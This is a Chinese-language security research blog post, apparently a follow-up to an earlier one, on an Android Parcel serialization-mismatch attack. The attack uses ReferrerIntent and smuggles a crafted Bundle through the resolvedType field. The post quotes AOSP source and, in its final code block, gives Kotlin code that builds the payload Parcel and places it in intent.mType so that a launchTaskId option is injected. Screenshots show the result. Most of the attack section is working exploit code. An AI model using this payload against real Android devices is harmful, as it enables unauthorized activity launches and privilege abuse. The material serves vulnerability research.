> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [konata.github.io](https://konata.github.io/posts/creator-mismatch-cont/)

> ReferrerIntent

ReferrerIntent[](#referrerintent)
---------------------------------

上文中使用了 `LabeledIntent` 作为 Intent 的子类来完成序列化不对称攻击, 里面说明了不选择 `ReferrerIntent` 的理由, 因为 `ReferrerIntent` 只多出一个 String16 的字段是我们可以控制的, 如下

```
public void writeToParcel(Parcel dest, int parcelableFlags) {
        super.writeToParcel(dest, parcelableFlags); // Intent
        dest.writeString(mReferrer); // 多出一个 String16
    }
```

和 `IActivityTaskManager.startActivity` 的参数做一个对比

```
Intent _arg3 = data.readTypedObject(android.content.Intent.CREATOR); // ReferrerIntent.mIntent
    java.lang.String resolvedType = data.readString(); // ReferrerIntent.mReferrer
    android.os.IBinder resultTo = data.readStrongBinder(); // resolvedType
    java.lang.String resultWho = data.readString(); // ...
    int requestCode = data.readInt();
    int flags = data.readInt();
    android.app.ProfilerInfo profilerInfo = data.readTypedObject(android.app.ProfilerInfo.CREATOR);
    android.os.Bundle options = data.readTypedObject(android.os.Bundle.CREATOR);
```

这个 String16 马上就被 `resolvedType` 消耗掉, 导致只能利用 `ChooseTypeAndAccountActivity` 自己提供的参数的错位来完成利用, 但是跟一下源码你会发现, 其实 `resolvedTyped` 也刚好是我们可以控制的, 如下

```
// Instrumentation.execStartActivity
int result = ActivityTaskManager.getService().startActivity(whoThread,
                who.getOpPackageName(), who.getAttributionTag(), intent,
                intent.resolveTypeIfNeeded(who.getContentResolver()), // ⬅️ resolvedType
                token,
                target != null ? target.mEmbeddedID : null, requestCode, 0, null, options);
```

```
// Intent.resolveTypeIfNeeded
public @Nullable String resolveTypeIfNeeded(@NonNull ContentResolver resolver) {
      // Match logic in PackageManagerService#applyEnforceIntentFilterMatching(...)
      if (mComponent != null && (Process.myUid() == Process.ROOT_UID
              || Process.myUid() == Process.SYSTEM_UID
              || mComponent.getPackageName().equals(ActivityThread.currentPackageName()))) {
          return mType; // ⬅️
      }
      return resolveType(resolver); // ⬇️
}

public @Nullable String resolveType(@NonNull ContentResolver resolver) {
     if (mType != null) {
         return mType; // ⬅️
     }
     if (mData != null) {
         if ("content".equals(mData.getScheme())) {
             return resolver.getType(mData);
         }
     }
     return null;
}
```

也就是说 ChooseTypeAndAccountActivity 提供给 ActivityTaskManagerService 的 resolvedType 参数, 其实也可以从 Intent 参数里面获取的, 这样就可以把 payload 全部藏在 resolvedType (即 intent.mType) 中, 由于只涉及修改一个 String16 字段, 整个 payload 的构造更简单, 如下

```
fun referrerIntent(): ReferrerIntent {
        val payload = Parcel.obtain().apply {
          writeInt(fixme(72)) //  -> string length, first part of binder

          // remain binder parts
          writeInt(2)
          writeInt(3)
          writeInt(4)
          writeInt(5)
          writeInt(6)

          writeString(null) // resultWho
          writeInt(0) // requestCode
          writeInt(0) // flags
          writeTypedObject(null, 0) // profiler info

          run {  // bundle
            writeInt(1) // typed object indicator
            writeInt(fixme(148)) // bundle back patch length
            writeInt(Const.BundleMagic)  // "BNDL"
            writeInt(2) // entry count
            writeString("android.activity.launchTaskId") // key 1
            writeValue(taskId) // value 1
            writeString("_") // key 2
            run { // value 2
              writeInt(Const.ValByteArray)
              writeInt(fixme(56)) // byte array length
              writeInt('@'.code) // 0
              writeInt(0) // String16 terminator and padding
            }
          }
        }
        payload.setDataPosition(0)
        val intent = intentFor<LoginActivity>().setType(payload.readString())
        return ReferrerIntent(intent, null)
      }
```

看一下效果

[![](https://konata.github.io/assets/images/tasks-before.png)](https://konata.github.io/assets/images/tasks-before.png)

[![](https://konata.github.io/assets/images/tasks-after.png)](https://konata.github.io/assets/images/tasks-after.png)

This post is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.